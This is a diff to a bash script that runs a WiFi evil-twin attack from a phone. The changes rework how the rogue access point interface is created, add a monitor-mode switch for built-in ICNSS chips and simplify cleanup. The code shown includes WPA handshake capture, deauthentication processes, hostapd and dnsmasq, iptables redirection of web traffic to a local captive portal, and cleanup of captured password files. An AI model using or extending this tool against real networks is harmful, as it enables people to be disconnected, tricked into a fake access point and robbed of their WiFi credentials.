@@ -18,10 +18,10 @@ FAKE_SSID=""
 HANDSHAKE_FILE=""
 DEAUTH_PID=""
 MON_INTERFACE=""
-AP_INTERFACE="wlan2"
+AP_INTERFACE=""
+AP_BASE=""
 INTERNET_INTERFACE=""
 SELECTED_INTERFACE=""
-ORIGINAL_CON_MODE=""  # Store original ICNSS con_mode
 
 detect_device() {
     local hostname="$1"
@@ -86,45 +86,36 @@ get_monitor_interface() {
     echo ""
 }
 
-# New function for ICNSS monitor mode
 enable_icnss_monitor() {
     local interface="$1"
     local con_mode_path="/sys/module/wlan/parameters/con_mode"
     
-    log_info "Attempting ICNSS monitor mode on $interface..."
+    echo >&2 ""
+    log_info "Attempting ICNSS monitor mode on $interface..." >&2
     
-    # Check if con_mode file exists
     if [ ! -f "$con_mode_path" ]; then
-        log_error "ICNSS con_mode file not found at $con_mode_path"
+        log_error "ICNSS con_mode file not found at $con_mode_path" >&2
         return 1
     fi
     
-    # Save original mode for cleanup
-    ORIGINAL_CON_MODE=$(cat "$con_mode_path" 2>/dev/null)
-    log_info "Original con_mode: $ORIGINAL_CON_MODE"
-    
-    # Take interface down
     ip link set "$interface" down 2>/dev/null
     
-    # Set monitor mode (4 = monitor)
     echo "4" > "$con_mode_path" 2>/dev/null
     if [ $? -ne 0 ]; then
-        log_error "Failed to set con_mode to 4"
+        log_error "Failed to set con_mode to 4" >&2
         ip link set "$interface" up 2>/dev/null
         return 1
     fi
     
-    # Bring interface up
     ip link set "$interface" up 2>/dev/null
     sleep 2
     
-    # Verify monitor mode
     if iw dev "$interface" info 2>/dev/null | grep -q "type monitor"; then
-        log_success "ICNSS monitor mode enabled on $interface (con_mode=4)"
+        log_success "ICNSS monitor mode enabled on $interface (con_mode=4)" >&2
         echo "$interface"
         return 0
     else
-        log_error "Failed to verify monitor mode on $interface"
+        log_error "Failed to verify monitor mode on $interface" >&2
         return 1
     fi
 }
@@ -133,82 +124,54 @@ cleanup() {
     echo ""
     log_info "Shutting down attack..."
     
-    # Kill processes
     pkill -f hostapd 2>/dev/null
     pkill -f dnsmasq 2>/dev/null
     pkill -f airodump-ng 2>/dev/null
     pkill -f aireplay-ng 2>/dev/null
     pkill -f "php -S" 2>/dev/null
     pkill -f passapi.py 2>/dev/null
+    pkill -f dnsspoof 2>/dev/null
     fuser -k 5000/tcp 2>/dev/null
     fuser -k 80/tcp 2>/dev/null
     [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
-    [ -n "$AP_INTERFACE" ] && iw dev "$AP_INTERFACE" del > /dev/null 2>&1
+    [ -n "$AIRODUMP_PID" ] && kill $AIRODUMP_PID 2>/dev/null
     
-    # Restore ICNSS original con_mode if it was changed
-    if [ -n "$ORIGINAL_CON_MODE" ] && [ -f "/sys/module/wlan/parameters/con_mode" ]; then
-        log_info "Restoring ICNSS con_mode to $ORIGINAL_CON_MODE"
-        echo "$ORIGINAL_CON_MODE" > /sys/module/wlan/parameters/con_mode 2>/dev/null
+    if [ -n "$AP_INTERFACE" ] && [ "$AP_BASE" != "$AP_INTERFACE" ]; then
+        log_info "Removing virtual AP interface $AP_INTERFACE..."
+        iw dev "$AP_INTERFACE" del > /dev/null 2>&1
     fi
     
-    # Note for user to manually stop monitor mode
-    log_warn "Monitor mode may still be enabled on your interfaces."
-    log_warn "To disable monitor mode manually, use: airmon-ng stop <interface>"
-    log_warn "Or restart your WiFi with: svc wifi disable && svc wifi enable"
+    if [ -n "$AP_INTERFACE" ] && [ "$AP_BASE" = "$AP_INTERFACE" ] && [ "$AP_INTERFACE" != "$MON_INTERFACE" ]; then
+        log_info "Resetting AP interface $AP_INTERFACE to managed mode..."
+        ip link set "$AP_INTERFACE" down
+        iw dev "$AP_INTERFACE" set type managed 2>/dev/null
+        ip link set "$AP_INTERFACE" up
+    fi
     
-    # iptables restore
+    
+    log_warn "Monitor mode is still enabled on $MON_INTERFACE"
+    log_warn "To disable it manually, run: airmon-ng stop $MON_INTERFACE"
+    
     if [ -f /sdcard/original ]; then
         log_info "Restoring iptables from /sdcard/original"
         iptables-restore < /sdcard/original
-        log_success "Iptables restored successfully"
+    else
+        iptables --flush
+        iptables -t nat --flush
+        echo 0 > /proc/sys/net/ipv4/ip_forward
     fi
     
-    # iptables cleanup (your existing code)
-    while iptables -t nat -D PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 2>/dev/null; do
-        :
-    done
-    while iptables -t nat -D POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE 2>/dev/null; do
-        :
-    done
-    iptables -D FORWARD -i "$AP_INTERFACE" -j ACCEPT 2>/dev/null || true
-    
-    while ip rule del pref 1 2>/dev/null; do
-        :
-    done
-    while ip rule del pref 11000 2>/dev/null; do
-        :
-    done
-    while ip rule del pref 17000 2>/dev/null; do
-        :
-    done
-    while ip rule del pref 21000 2>/dev/null; do
-        :
-    done
+    timeout 2 iptables -t nat -D PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 2>/dev/null
+    timeout 2 iptables -t nat -D POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE 2>/dev/null
+    timeout 2 iptables -D FORWARD -i "$AP_INTERFACE" -j ACCEPT 2>/dev/null
     
     log_info "Cleaning up temporary files..."
     rm -f evil-*.cap evil-*.csv evil-*.kismet.* evil-*.netxml
-    rm -f /tmp/target_bssid.txt /tmp/target_channel.txt /tmp/target_ssid.txt 
-    rm -f /tmp/scan* /tmp/airodump.log /tmp/deauth.log
-    rm -f nohup.out
-    rm -f *.pcap
-    rm -f attempts.txt password.txt
-    rm -f /tmp/hostapd.log
-    rm -f /tmp/dnsmasq.log
-    rm -f /tmp/shown_connections.txt 
-    rm -f /tmp/shown_disconnections.txt
-    rm -f /tmp/connection_cache.txt
-    rm -f /tmp/dns_shown_macs.txt
-    rm -f /tmp/dhcp_shown.txt
-    if [ -n "$HANDSHAKE_FILE" ] && [ -f "$HANDSHAKE_FILE" ]; then
-        rm -f "$HANDSHAKE_FILE"
-    fi
-    if [ -n "$TARGET_SSID" ]; then
-        SAFE_SSID=$(echo "$TARGET_SSID" | sed 's/[^a-zA-Z0-9]/_/g')
-        rm -f "${SAFE_SSID}.cap"
-    fi
-    rm -f *.pid
+    [ -n "$HANDSHAKE_FILE" ] && [ -f "$HANDSHAKE_FILE" ] && rm -f "$HANDSHAKE_FILE" && log_info "Removed saved handshake: $HANDSHAKE_FILE"
+    rm -f /tmp/target_* /tmp/scan* /tmp/airodump.log /tmp/deauth.log /tmp/hostapd.log /tmp/dnsmasq.log
+    rm -f nohup.out *.pcap attempts.txt password.txt /tmp/*.txt *.pid
+    
     log_success "Cleanup complete"
-    log_warn "Remember to manually disable monitor mode if needed!"
     exit 0
 }
 trap cleanup SIGINT SIGTERM EXIT
@@ -322,7 +285,6 @@ scan_networks() {
     
     log_info "Setting $SELECTED_INTERFACE to monitor mode..."
     
-    # Check if this is an ICNSS interface (built-in phone WiFi)
     local driver=""
     if command -v ethtool >/dev/null 2>&1; then
         driver=$(ethtool -i "$SELECTED_INTERFACE" 2>/dev/null | grep "driver:" | cut -d: -f2 | sed 's/^[[:space:]]*//')
@@ -336,7 +298,6 @@ scan_networks() {
             exit 1
         fi
     else
-        # Standard method for normal drivers
         ifconfig "$SELECTED_INTERFACE" down 2>/dev/null
         iw dev "$SELECTED_INTERFACE" set type monitor 2>/dev/null
         ifconfig "$SELECTED_INTERFACE" up 2>/dev/null
@@ -407,10 +368,8 @@ capture_handshake() {
     local ssid="$3"
     log_info "Capturing handshake for $ssid on channel $channel..."
     
-    # Clean old capture files
     rm -f evil-*.cap /tmp/handshake_check.cap 2>/dev/null
     
-    # Use iw instead of iwconfig
     iw dev $MON_INTERFACE set channel "$channel" 2>/dev/null
     sleep 2
     
@@ -424,7 +383,6 @@ capture_handshake() {
     
     HANDSAKE_CAPTURED=false
     
-    # Wait for capture file to be created
     for i in {1..10}; do
         if [ -f "evil-01.cap" ]; then
             log_info "Capture file created"
@@ -433,10 +391,8 @@ capture_handshake() {
         sleep 1
     done
     
-    # Check for handshake using temp file (fixes corruption issue)
     for i in {1..60}; do
         if [ -f "evil-01.cap" ]; then
-            # Copy to temp file to avoid reading live file
             cp evil-01.cap /tmp/handshake_check.cap 2>/dev/null
             
             if aircrack-ng /tmp/handshake_check.cap 2>/dev/null | grep -q "1 handshake"; then
@@ -448,15 +404,13 @@ capture_handshake() {
             rm -f /tmp/handshake_check.cap
         fi
         
-        # Show progress every 10 seconds
         if [ $((i % 6)) -eq 0 ]; then
             echo -ne "\rWaiting for handshake... $((i/6 * 10)) seconds elapsed"
         fi
         sleep 10
     done
-    echo ""  # New line after progress
+    echo ""
     
-    # Kill airodump
     sudo kill $AIRODUMP_PID 2>/dev/null
     sleep 2
     
@@ -508,23 +462,30 @@ update_configs() {
 select_interfaces() {
     echo "----------------------------------------"
     echo "AP Interface Selection:"
-    echo " 1. wlan1"
-    echo " 2. wlan2 (default)"
-    echo " 3. wlan3"
-    echo " 4. Custom name"
+    echo " 1. Create virtual AP from wlan0 (built-in)"
+    echo " 2. Use existing external adapter directly"
+    echo " 3. Custom interface name"
     echo "----------------------------------------"
     
-    read -p "Select AP interface [1-4]: " ap_choice
+    read -p "Select AP source [1-3]: " ap_source
     
-    case $ap_choice in
-        1) AP_INTERFACE="wlan1" ;;
-        2) AP_INTERFACE="wlan2" ;;
-        3) AP_INTERFACE="wlan3" ;;
-        4) 
-            read -p "Enter custom AP interface: " custom_ap
-            AP_INTERFACE="${custom_ap:-wlan2}"
+    case $ap_source in
+        1)
+            AP_BASE="wlan0"
+            read -p "Enter name for virtual AP interface (e.g., wlan2, wlan3, ap0): " AP_INTERFACE
+            log_info "Will create virtual AP from $AP_BASE as $AP_INTERFACE"
             ;;
-        *) AP_INTERFACE="wlan2" ;;
+        2)
+            echo "Available interfaces:"
+            ip link show | grep -E "^[0-9]+: (wlan|eth|rmnet|bat|usb)" | cut -d: -f2 | sed 's/ //g'
+            read -p "Enter interface name to use for AP: " AP_INTERFACE
+            AP_BASE="$AP_INTERFACE"
+            log_info "Using $AP_INTERFACE directly for AP"
+            ;;
+        3)
+            read -p "Enter custom AP interface name: " AP_INTERFACE
+            AP_BASE="$AP_INTERFACE"
+            ;;
     esac
     
     echo "----------------------------------------"
@@ -566,16 +527,45 @@ setup_internet_sharing() {
     echo "Checking for existing $AP_INTERFACE interface..."
     if ip link show "$AP_INTERFACE" 2>/dev/null; then
         echo "$AP_INTERFACE exists, continuing.."
+        
+        if [ "$AP_BASE" = "$AP_INTERFACE" ]; then
+            echo "Setting $AP_INTERFACE to AP mode..."
+            ip link set "$AP_INTERFACE" down
+            iw dev "$AP_INTERFACE" set type __ap
+            ip link set "$AP_INTERFACE" up
+            sleep 2
+            
+            if ! ip link show "$AP_INTERFACE" | grep -q "state UP"; then
+                log_error "AP interface $AP_INTERFACE failed to come UP!"
+                exit 1
+            fi
+            log_success "AP interface $AP_INTERFACE is UP"
+        fi
     else
-        if [[ $(iw list 2>/dev/null | grep '* AP') == *"* AP"* ]]; then
-            echo "wlan0 supports AP mode, creating AP interface.."
-            iw dev wlan0 interface add "$AP_INTERFACE" type __ap
-            ip addr flush "$AP_INTERFACE"
+        if [ "$AP_BASE" != "$AP_INTERFACE" ]; then
+            echo "Creating virtual AP interface $AP_INTERFACE from $AP_BASE..."
+            iw dev "$AP_BASE" interface add "$AP_INTERFACE" type __ap
             ip addr flush "$AP_INTERFACE"
             ip link set up dev "$AP_INTERFACE"
+            sleep 2
+            
+            if ! ip link show "$AP_INTERFACE" | grep -q "state UP"; then
+                log_error "Virtual AP interface $AP_INTERFACE failed to come UP!"
+                exit 1
+            fi
+            log_success "Virtual AP interface $AP_INTERFACE is UP"
         else
-            echo "wlan0 doesn't support AP mode, exiting.."
-            exit 1
+            echo "Using existing interface $AP_INTERFACE directly for AP"
+            ip link set "$AP_INTERFACE" down
+            iw dev "$AP_INTERFACE" set type __ap
+            ip link set "$AP_INTERFACE" up
+            sleep 2
+            
+            if ! ip link show "$AP_INTERFACE" | grep -q "state UP"; then
+                log_error "AP interface $AP_INTERFACE failed to come UP!"
+                exit 1
+            fi
+            log_success "AP interface $AP_INTERFACE is UP"
         fi
     fi
     
